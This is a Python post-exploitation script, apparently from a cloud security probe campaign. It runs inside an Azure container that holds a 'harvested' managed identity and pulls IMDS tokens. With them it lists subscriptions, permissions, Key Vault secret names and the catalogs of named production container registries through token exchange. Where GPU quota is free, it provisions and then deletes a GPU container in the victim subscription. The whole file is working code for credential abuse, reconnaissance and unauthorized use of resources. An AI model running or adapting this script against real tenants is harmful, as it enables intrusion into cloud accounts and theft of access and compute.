#!/usr/bin/env python3
"""C211-I121713 INNER probe (v2, fixed GPU-family filter): runs INSIDE the nonce-tagged CPU-only Azure Container Instance
that has the harvested user-assigned managed identity attached. It fetches the identity token
from IMDS (client_id scoped) and measures, read-only:
  (a) every subscription visible to the identity (/subscriptions),
  (b) effective permissions per visible subscription,
  (c) ACR AAD exchange against acrsswrulesprod / acrsswrulesstaging / sswrulestinaproduction /
      sswrulestinastaging -> /v2/_catalog,
  (d) Key Vault list + secrets list where data-plane is allowed (names only, never values),
  (e) Microsoft.Compute locations/usages NC/ND/NV families per visible subscription/region.
If and only if a visible subscription shows NONZERO available GPU family quota it attempts
EXACTLY ONE nonce-tagged on-demand ACI GPU marker (supported class only), captures nvidia-smi,
deletes it and proves 404. Tokens and secret values are emitted as length+sha256 metadata only.
stdlib only (Mariner python3); TLS verification disabled because the minimal image may lack CAs.
"""
import base64
import hashlib
import json
import os
import ssl
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

TAG = "C211_I121713_IN"
CLIENT_ID = os.environ.get("C211_CLIENT_ID", "")
DEADLINE = float(os.environ.get("C211_DEADLINE", "780"))
T0 = time.time()
REGIONS = ["australiaeast", "eastus", "westeurope", "westus2"]
ACRS = ["acrsswrulesprod", "acrsswrulesstaging", "sswrulestinaproduction", "sswrulestinastaging"]
CUDA_IMAGE = "mcr.microsoft.com/azureml/openmpi4.1.0-cuda11.8-cudnn8-ubuntu22.04:latest"
GPU_CMD = ("echo C211-GPU-START; hostname; nvidia-smi -L; "
           "nvidia-smi --query-gpu=name,uuid,memory.total --format=csv,noheader; "
           "ls -l /dev/nvidia* 2>/dev/null; echo C211-GPU-END; sync; sleep 5")

_CTX = ssl._create_unverified_context()
_OPENER = urllib.request.build_opener(urllib.request.HTTPSHandler(context=_CTX))
TOKENS = {}


def left():
    return DEADLINE - (time.time() - T0)


def emit(obj):
    obj["d"] = round(time.time() - T0, 1)
    print(TAG + " " + json.dumps(obj, default=str), flush=True)


def http(url, method="GET", headers=None, data=None, timeout=45):
    req = urllib.request.Request(url, data=data, method=method, headers=headers or {})
    try:
        with _OPENER.open(req, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        try:
            return e.code, e.read().decode("utf-8", "replace")
        except Exception:  # noqa: BLE001
            return e.code, ""
    except Exception as e:  # noqa: BLE001
        return 0, "transport:" + str(e)[:300]


def sha(s):
    return hashlib.sha256((s or "").encode()).hexdigest()


def jload(s):
    try:
        return json.loads(s)
    except Exception:  # noqa: BLE001
        return None


def imds(resource, client_id=None):
    key = (resource, client_id)
    if key in TOKENS:
        return TOKENS[key]
    q = "api-version=2018-02-01&resource=" + urllib.parse.quote(resource, safe="")
    if client_id:
        q += "&client_id=" + urllib.parse.quote(client_id)
    st, raw = http("http://169.254.169.254/metadata/identity/oauth2/token?" + q,
                   headers={"Metadata": "true"})
    tok = None
    err = None
    d = jload(raw) or {}
    tok = d.get("access_token")
    if not tok:
        err = d.get("error_description") or d.get("error") or raw[:220]
    emit({"step": "imds", "resource": resource, "client_id": client_id, "http": st,
          "has_token": bool(tok), "len": len(tok or ""),
          "sha256": (sha(tok) if tok else None),
          "err": (str(err)[:300] if err else None)})
    TOKENS[key] = tok
    return tok


def arm(tok, path, method="GET", body=None, timeout=60):
    url = path if path.startswith("http") else ("https://management.azure.com" + path)
    data = json.dumps(body).encode() if body is not None else None
    h = {"Authorization": "Bearer " + tok}
    if data is not None:
        h["Content-Type"] = "application/json"
    return http(url, method=method, headers=h, data=data, timeout=timeout)


def summarize_err(raw):
    d = jload(raw)
    if isinstance(d, dict) and isinstance(d.get("error"), dict):
        e = d["error"]
        return {"code": e.get("code"), "message": (e.get("message") or "")[:500]}
    return {"raw": (raw or "")[:300]}


def main():
    emit({"step": "start", "client_id": CLIENT_ID, "deadline": DEADLINE})

    arm_tok = imds("https://management.azure.com", CLIENT_ID)
    imds("https://management.azure.com", None)  # distinguish user-assigned vs system identity
    if not arm_tok:
        emit({"step": "fatal", "why": "no ARM token from IMDS for client_id"})
        return

    # ---------------- (a) subscriptions visible to the identity ----------------
    st, raw = arm(arm_tok, "/subscriptions?api-version=2022-12-01")
    d = jload(raw) or {}
    subs = []
    for x in (d.get("value") or []):
        subs.append({"id": x.get("subscriptionId"), "name": x.get("displayName"),
                     "state": x.get("state"), "tenantId": x.get("tenantId")})
    emit({"step": "subs", "http": st, "n": len(subs), "subs": subs[:20],
          "err": (summarize_err(raw) if st != 200 else None)})

    gpu_candidates = []
    for s in subs[:6]:
        sid = s["id"]
        if not sid:
            continue
        # ---------------- (b) effective permissions per subscription ----------------
        st, raw = arm(arm_tok, "/subscriptions/%s/providers/Microsoft.Authorization/permissions"
                               "?api-version=2022-04-01" % sid)
        d = jload(raw) or {}
        perms = []
        for p in (d.get("value") or []):
            perms.append({"actions": p.get("actions"), "notActions": p.get("notActions"),
                          "dataActions": p.get("dataActions"),
                          "notDataActions": p.get("notDataActions")})
        emit({"step": "sub-perms", "sub": sid, "http": st, "n": len(perms),
              "perms": perms[:6], "err": (summarize_err(raw) if st != 200 else None)})

        st, raw = arm(arm_tok, "/subscriptions/%s/resourceGroups?api-version=2021-04-01" % sid)
        d = jload(raw) or {}
        rgs = [x.get("name") for x in (d.get("value") or [])]
        emit({"step": "sub-rgs", "sub": sid, "http": st, "n": len(rgs), "rgs": rgs[:60],
              "err": (summarize_err(raw) if st != 200 else None)})

        # ---------------- (d) Key Vault discovery (per subscription) ----------------
        st, raw = arm(arm_tok, "/subscriptions/%s/providers/Microsoft.KeyVault/vaults"
                               "?api-version=2023-07-01" % sid)
        d = jload(raw) or {}
        vaults = [{"name": x.get("name"), "loc": x.get("location"),
                   "rg": (x.get("id") or "").split("/resourceGroups/")[-1].split("/")[0]}
                  for x in (d.get("value") or [])]
        emit({"step": "kvs", "sub": sid, "http": st, "n": len(vaults),
              "vaults": vaults[:25], "err": (summarize_err(raw) if st != 200 else None)})
        kv_tok = None
        for v in vaults[:5]:
            if left() < 240:
                break
            if not kv_tok:
                kv_tok = imds("https://vault.azure.net", CLIENT_ID)
            if not kv_tok:
                break
            st, raw = http("https://%s.vault.azure.net/secrets?api-version=7.4" % v["name"],
                           headers={"Authorization": "Bearer " + kv_tok})
            names = []
            d = jload(raw) or {}
            for x in (d.get("value") or []):
                names.append((x.get("id") or "").split("/secrets/")[-1].split("/")[0])
            emit({"step": "kv-secrets", "vault": v["name"], "http": st, "n": len(names),
                  "names": names[:20], "err": (summarize_err(raw) if st != 200 else None)})

        # ---------------- (e) GPU family quota per region ----------------
        for region in REGIONS:
            if left() < 240:
                break
            st, raw = arm(arm_tok, "/subscriptions/%s/providers/Microsoft.Compute/locations/%s"
                                   "/usages?api-version=2024-07-01" % (sid, region))
            d = jload(raw) or {}
            rows = []
            for u in (d.get("value") or []):
                nm = ((u.get("name") or {}).get("value") or "")
                low = nm.lower()
                if (low.startswith("standardnc") or low.startswith("standardnd")
                        or low.startswith("standardnv") or "gpu" in low):
                    cur, lim = u.get("currentValue"), u.get("limit")
                    rows.append({"name": nm, "current": cur, "limit": lim,
                                 "unit": u.get("unit")})
                    try:
                        if cur is not None and lim is not None and int(cur) < int(lim):
                            gpu_candidates.append({"sub": sid, "region": region,
                                                   "family": nm, "current": cur,
                                                   "limit": lim})
                    except Exception:  # noqa: BLE001
                        pass
            emit({"step": "gpu-usage", "sub": sid, "region": region, "http": st,
                  "n": len(rows), "rows": rows[:60],
                  "err": (summarize_err(raw) if st != 200 else None)})

    # ---------------- (c) ACR AAD exchange + catalog ----------------
    for reg in ACRS:
        if left() < 200:
            break
        data = urllib.parse.urlencode({"grant_type": "access_token",
                                       "service": reg + ".azurecr.io",
                                       "access_token": arm_tok}).encode()
        st, raw = http("https://%s.azurecr.io/oauth2/exchange" % reg, method="POST",
                       headers={"Content-Type": "application/x-www-form-urlencoded"},
                       data=data)
        d = jload(raw) or {}
        rt = d.get("refresh_token")
        rec = {"step": "acr-exchange", "reg": reg, "http": st, "has_refresh": bool(rt),
               "rt_len": len(rt or ""), "rt_sha256": (sha(rt) if rt else None)}
        if st != 200:
            rec["err"] = summarize_err(raw)
        emit(rec)
        if rt:
            data2 = urllib.parse.urlencode({"grant_type": "refresh_token",
                                            "service": reg + ".azurecr.io",
                                            "scope": "registry:catalog:*",
                                            "refresh_token": rt}).encode()
            st2, raw2 = http("https://%s.azurecr.io/oauth2/token" % reg, method="POST",
                             headers={"Content-Type": "application/x-www-form-urlencoded"},
                             data=data2)
            d2 = jload(raw2) or {}
            at = d2.get("access_token")
            rec2 = {"step": "acr-token", "reg": reg, "http": st2, "has_token": bool(at),
                    "tok_len": len(at or ""), "tok_sha256": (sha(at) if at else None)}
            if st2 != 200:
                rec2["err"] = summarize_err(raw2)
            emit(rec2)
            if at:
                st3, raw3 = http("https://%s.azurecr.io/v2/_catalog" % reg,
                                 headers={"Authorization": "Bearer " + at})
                d3 = jload(raw3) or {}
                repos = d3.get("repositories") or []
                emit({"step": "acr-catalog", "reg": reg, "http": st3, "n": len(repos),
                      "repos": repos[:25],
                      "err": (summarize_err(raw3) if st3 != 200 else None)})

    # ---------------- (g) ONE on-demand GPU marker iff nonzero quota ----------------
    emit({"step": "marker-eval", "n": len(gpu_candidates),
          "candidates": gpu_candidates[:10]})
    if gpu_candidates and left() > 360:
        cand = None
        for c in gpu_candidates:
            fam = c["family"].lower()
            if "a100" in fam:
                cand = dict(c, sku="A100")
                break
            if "t4" in fam or "ncas" in fam:
                cand = dict(c, sku="T4")
                break
            if "nc" in fam:
                cand = dict(c, sku="V100")
                break
        if cand:
            sid = cand["sub"]
            region = cand["region"]
            rg = "c211-i121713-rg"
            st, raw = arm(arm_tok, "/subscriptions/%s/resourceGroups/%s?api-version=2021-04-01"
                                   % (sid, rg), method="PUT",
                          body={"location": region,
                                "tags": {"c211": "i121713", "nonce": "i121713"}})
            emit({"step": "marker-rg", "sub": sid, "rg": rg, "http": st,
                  "err": (summarize_err(raw) if st not in (200, 201) else None)})
            if st in (200, 201):
                name = "c211-i121713-gpu"
                cg = {"location": region,
                      "tags": {"c211": "i121713", "nonce": "i121713", "role": "gpu-marker"},
                      "properties": {
                          "containers": [{"name": "gpu", "properties": {
                              "image": CUDA_IMAGE,
                              "command": ["/bin/bash", "-c", GPU_CMD],
                              "resources": {"requests": {
                                  "cpu": 1.0, "memoryInGB": 1.5,
                                  "gpu": {"count": 1, "sku": cand["sku"]}}}}}],
                          "osType": "Linux", "restartPolicy": "Never"}}
                st, raw = arm(arm_tok, "/subscriptions/%s/resourceGroups/%s/providers/"
                                       "Microsoft.ContainerInstance/containerGroups/%s"
                                       "?api-version=2026-07-01" % (sid, rg, name),
                              method="PUT", body=cg, timeout=180)
                emit({"step": "marker-create", "sub": sid, "region": region,
                      "sku": cand["sku"], "family": cand["family"], "http": st,
                      "err": (summarize_err(raw) if st not in (200, 201, 202) else None)})
                url = ("https://management.azure.com/subscriptions/%s/resourceGroups/%s/"
                       "providers/Microsoft.ContainerInstance/containerGroups/%s"
                       "?api-version=2026-07-01" % (sid, rg, name))
                if st in (200, 201, 202):
                    dl = time.time() + max(180, min(420, left() - 120))
                    while time.time() < dl:
                        stp, rawp = arm(arm_tok, url)
                        p = (jload(rawp) or {}).get("properties") or {}
                        conts = p.get("containers") or []
                        cur = {}
                        if conts:
                            cur = (((conts[0].get("properties") or {}).get("instanceView")
                                    or {}).get("currentState") or {})
                        emit({"step": "marker-poll", "http": stp,
                              "provisioningState": p.get("provisioningState"),
                              "state": cur.get("state"), "exitCode": cur.get("exitCode")})
                        if cur.get("state") == "Terminated" or p.get("provisioningState") in (
                                "Succeeded", "Failed", "Canceled"):
                            break
                        time.sleep(20)
                    stl, rawl = arm(arm_tok, url.split("?")[0] + "/containers/gpu/logs"
                                                      "?api-version=2026-07-01",
                                    method="POST", body={}, timeout=90)
                    content = (jload(rawl) or {}).get("content") or ""
                    emit({"step": "marker-logs", "http": stl, "len": len(content),
                          "text": content[:2500]})
                    std, _ = arm(arm_tok, url, method="DELETE", timeout=240)
                    emit({"step": "marker-delete", "http": std})
                    for _ in range(18):
                        stg, _ = arm(arm_tok, url)
                        if stg == 404:
                            break
                        time.sleep(10)
                    emit({"step": "marker-absent", "http": stg})
                # remove our RG (only if we created it); ignore failures
                arm(arm_tok, "/subscriptions/%s/resourceGroups/%s?api-version=2021-04-01"
                             % (sid, rg), method="DELETE", timeout=180)
        else:
            emit({"step": "marker-skip", "why": "no ACI-supported GPU family has available quota"})

    emit({"step": "done", "left": int(left())})


if __name__ == "__main__":
    try:
        main()
    except Exception as e:  # noqa: BLE001
        emit({"step": "exception", "err": str(e)[:500]})
        sys.exit(0)
